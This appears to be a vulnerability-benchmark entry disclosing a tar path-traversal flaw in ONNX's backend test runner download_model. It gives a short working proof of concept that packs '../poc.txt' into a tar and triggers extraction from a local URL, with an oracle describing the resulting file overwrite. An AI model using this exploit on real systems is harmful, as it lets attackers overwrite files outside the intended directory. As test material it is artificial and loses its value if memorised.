title: Arbitrary file overwrite in onnx/backend/test/runner/download_model due to lack of path traversal protection in tarfile extraction
trigger_payload:
import tarfile
import os
tar = tarfile.open("poc.tar","w")
tar.add('../poc.txt')
tar.close()

import onnx.backend.test as obt
import onnx.backend as ob
testcast = obt.runner.TestCase(name="evil", model_name="onnx", url="http://127.0.0.1:8000/poc.tar", model_dir=None, model=None, data_sets=None, kind="tar", rtol=0.0, atol=0.0)
runner = obt.runner.Runner.download_model(testcast, "", "./")
oracle: arbitrary file overwrite occurs, such as creating or overwriting files in the parent directory of the target path
